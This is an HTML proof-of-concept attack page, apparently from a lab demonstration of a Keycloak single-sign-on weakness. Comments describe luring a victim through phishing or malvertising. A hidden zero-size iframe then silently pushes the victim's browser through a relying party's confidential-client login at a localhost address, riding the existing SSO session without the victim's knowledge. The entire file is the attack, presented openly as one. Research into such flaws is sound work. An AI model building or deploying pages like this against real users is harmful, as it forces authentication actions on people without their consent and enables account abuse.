<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Totally harmless page</title>
</head>
<body>
  <h1>Nothing to see here</h1>
  <p>(This is the page a victim would be lured to, e.g. via a phishing link,
  malvertising, or a comment/forum post - it looks empty, but...)</p>

  <!--
    Hidden iframe silently drives the victim's browser through the RP's
    confidential-client login. Since the victim already has a Keycloak SSO
    session, this completes without any visible UI or user interaction.
  -->
  <iframe src="http://localhost:8081/conf/login"
          style="display:none;width:0;height:0;border:0" title=""></iframe>
</body>
</html>
